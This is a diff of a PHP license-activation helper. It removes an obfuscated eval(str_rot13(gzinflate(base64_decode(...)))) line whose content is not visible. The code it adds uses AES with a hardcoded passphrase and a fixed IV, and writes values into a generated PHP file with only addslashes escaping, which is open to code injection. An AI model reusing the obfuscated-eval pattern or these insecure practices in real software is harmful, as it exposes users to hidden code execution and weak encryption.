@@ -1,3 +1,100 @@
 <?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
-?>
+require("key.php");
+
+
+class AES_Encryption
+{
+	private $key;
+	private $iv;
+
+	public function __construct($key)
+	{
+		$this->key = hash('sha256', $key, true); // Kunci 32 byte
+		$this->iv = substr(hash('sha256', 'iv_secret', true), 0, 16); // IV 16 byte
+	}
+
+	public function encrypt($data)
+	{
+		return base64_encode(openssl_encrypt($data, 'AES-256-CBC', $this->key, OPENSSL_RAW_DATA, $this->iv));
+	}
+
+	public function decrypt($encryptedData)
+	{
+		return openssl_decrypt(base64_decode($encryptedData), 'AES-256-CBC', $this->key, OPENSSL_RAW_DATA, $this->iv);
+	}
+}
+
+
+$key_mem	= new AES_Encryption('@Triyono68');
+$mem			= $key_mem->decrypt($code_mem);
+
+$key_code	= new AES_Encryption($mem);
+$d_exp		= $key_code->decrypt($code);
+
+
+
+function nmpt($nama)
+{
+	$kunci = new AES_Encryption('@Triyono68');
+	return $kunci->encrypt($nama);
+}
+
+function file_key($file, $nm, $kd_aktif)
+{
+	$nm = nmpt($nm);
+	file_put_contents($file, '');
+	$data = "<?php\n";
+	$data .= "\$code_mem = \"" . addslashes($nm) . "\";\n";
+	$data .= "\$code = \"" . addslashes($kd_aktif) . "\";\n";
+	$data .= "?>";
+
+	if (file_put_contents($file, $data, FILE_APPEND)) {
+		return '<meta http-equiv="refresh" content="3">';
+	} else {
+		$err = "<p style='color: red;'>Gagal menyimpan data!</p>";
+	}
+	return $err;
+}
+
+function cek_aktif($date, $exc, $date2 = null)
+{
+	if (empty($date2)) {
+		$date2 = date('m/d/Y');
+	} else {
+		$date2 = date('Y-m-d', strtotime('+1 week'));
+	}
+	switch ($exc) {
+		case '<':
+			if (strtotime($date) < strtotime($date2)) {
+				return true;
+			}
+			break;
+		case '>':
+			if (strtotime($date) > strtotime($date2)) {
+				return true;
+			}
+			break;
+		case '=':
+			if (strtotime($date) == strtotime($date2)) {
+				return true;
+			}
+			break;
+		case '<=':
+			if (strtotime($date) <= strtotime($date2)) {
+				return true;
+			}
+			break;
+		case '>=':
+			if (strtotime($date) >= strtotime($date2)) {
+				return true;
+			}
+			break;
+	}
+	return false;
+}
+
+function validateDate($date)
+{
+	$timestamp = strtotime($date);
+	return ($timestamp !== false);
+}
